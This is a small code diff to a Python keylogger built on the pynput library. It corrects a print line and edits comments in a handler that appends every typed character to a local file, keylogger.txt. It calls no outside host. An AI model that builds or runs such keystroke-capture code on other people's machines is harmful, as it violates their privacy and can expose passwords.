@@ -11,15 +11,15 @@ from pynput import keyboard
 # prints typed key in terminal & creates .txt file
 def keyPressed(key):
     # {0} refers to (key)
-    print("{0} pressed")
+    print(str(key) + " pressed")
     # use 'a' bc we need to create new file if not exist already
-    #   & we need file open for writing
+    #   & we need file open for writing (appends)
     with open("keylogger.txt", 'a') as keyFile:
         try:
             keyChar = key.char # converts ascii to char
-            keyFile.write(keyChar) # logs char
+            keyFile.write(keyChar) # logs char 
         except:
-             print("CHAR ERROR")
+             print("CHAR ERROR") 
 
 # def KeyReleased(key): not needed bc not nec for tracking key
 
